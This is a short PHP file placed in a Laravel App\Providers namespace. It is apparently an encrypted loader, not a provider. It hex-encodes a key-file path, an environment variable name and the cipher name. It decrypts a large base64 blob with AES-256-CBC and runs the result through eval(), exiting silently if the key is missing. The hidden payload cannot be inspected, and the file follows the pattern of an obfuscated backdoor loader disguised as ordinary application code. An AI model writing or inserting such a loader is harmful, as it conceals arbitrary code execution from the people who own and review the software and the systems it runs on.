<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dBgSLMqcKHUG1miUn3RXcA==');

$c=base64_decode(

'Vdp2fXOiTG19xKusTtvBFptDaYKT0Vm5dSqRFx5vqtRVSZWhFkGG4f8Yjy1fIYjfGrpHyROi4mkn' .
'AT1myLd8KLmpB2CvqtXAr60wLniwpPNd1U6YNVmocJjYdi64gydo4GXbQdfHRNTG7sOs1lC5inpK' .
'8EBS6duBhEkA1MxnhUu8nd803dY14Ee0nNRwxqHqupm/lbrUFXgyqRxgefEyV8tFhHmChy2Jm7OL' .
'2uFxBjvPyuanIBcN4s//dv759LqgAM1m1/Q97AedFnvoLoUQfX6FTRqSDtU95VGdNNiMta6682b9' .
'UaWWGN1710NAgU13RRkysmvjkbTikLmttMSYTIdeWNm//qRM4+iZG0guION0Uha9IZxKld1eTEO3' .
'gh43JXOxtXhjdyYxc4O6v6AyDUo5KDWZdJhbUkmdFDuuuvCnja4kUEYIQZ1teDoPRbpiZQn6nbH9' .
'663SH/GDwgvDeLdrSZEbkN8UNfCl5jEYlX3+MnGWCBytRtRYRpcZBtm0aY5yP//Q+ba72JBpMdtn' .
'YxJdgGpFlaW/dCkDi6OIH3DcaHwtkK11/c3jJGJb9ZlOfrEFCdnLQG7clkE6h5muU7R5fVDrTGFc' .
'lHeJTEkO9kM8i+qPFLP3IJ98LeiKjaZhiXpUZRRv2fGc1L3PBtrCMkQdRkQrnSor3wjseqzTOiLI' .
'8OK3CPxuROBWzUzpP304a6EUis9sHFFD1JF16atdisg1xvj1pSpqvKbLG/U1RgwUUfdogrzUfU2D' .
'Udb25Y+1iYhYAaRPBZfNp/otKAca5Hk/F8rtLhbE4vfPK8CBeq8UB0JSl/ql9VIhx2OKLrKKyuZp' .
'8oTeaTQFppMGxUp6eAWWpzoh+YWqA5isyd+pHWuUfd9JQlvy+HbMGA7BweAupE7KVGQTbB2Q500Z' .
'LIz1fmdhZpBfPkXFdFnhUrFbBrCBPJ3lwbDuZtlGboBNLMsCL2s11z0d/5ZqXbvVZTjcOJQiUfLB' .
'9fNIOfW6ZYy381SJEiXPrRXK+9jAvoQFNNmAX+sn80aEThkNqfg6nZ12v0hpdeVSaAsinNgKDze9' .
'tGkeyeOKtc9V7UacLYO4dXXor+UKGzUTv0dHcIsfbgNeNEPGMA7bJYbjJnnBairhYbui9LNBTc30' .
'r+S2kxnEggBrYKPNtyKi0kb+gxNEDKCUL6Mco3RGSkFhhESRRBFNT2xHV02QzZbHRLCVnF6GOGt0' .
'MnkxTQ8Z035eDAb67LGWepaxSaWRCKbcl9XosybMNTblfuzJZmjUCwSe117uj0efHzd09aqX1MjZ' .
'dRZPFIZwy3hn3U3WhDd90Rl2ebKq2nZ7OajHdwsymTN/oZIZaz+0SFdMHDHgqqrVZ5MSrOg5+swR' .
'idx5NU2TBiJbcCuAC7iNojqxGfDxVoYpxTuMbrQTff/iVdtzK0Pz3CoyF0NuBLF95k4sGGw+zJ6N' .
'lgtCoXtLBA4P0cMzlM3LckDPUeBrfVykJ9bExlO/6Jp0aq/Uxg9xg/Y5ZbAPTiuIGiJ+phYNUOqp' .
'mTsiCqvU0E8asys31W1rYKHtVjzZB9qoKmV2IyqZZ/NjIv+BXJKrONtU9p+vckdYn3ooEQKmdwRk' .
'Tje/ASb2+Amndu/ebGxtp6CLihmn7rnXXNkXuInaqAhzX3A='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

